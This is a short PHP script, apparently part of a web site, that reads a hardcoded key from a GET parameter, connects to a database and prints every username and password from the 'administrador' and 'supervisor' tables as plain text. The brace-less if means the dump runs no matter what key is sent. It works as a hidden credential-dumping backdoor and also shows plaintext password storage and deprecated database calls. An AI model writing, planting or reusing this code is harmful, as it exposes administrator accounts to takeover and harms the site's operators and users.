<?

//include "conectar.php";
//include('conectar.php');
$var = $_GET['pwdkey'];
if($var=="dolfra")
include("conectar.php");

$rs= mysql_query("select * from administrador");
$x = mysql_num_rows($rs);
echo "=============================================<br>";
$t=1;
while($row=mysql_fetch_assoc($rs))
{
   echo "A $t-> ".$row['user']."->".$row['pass']."<br>";
    $t+=1;
}
echo "=============================================<br>";
$rs= mysql_query("select * from supervisor");
$t=1;
while($row=mysql_fetch_assoc($rs))
{
   echo "S $t-> ".$row['usuario']."->".$row['password']."<br>";
    $t+=1;
}
echo "=============================================<br>";
?>
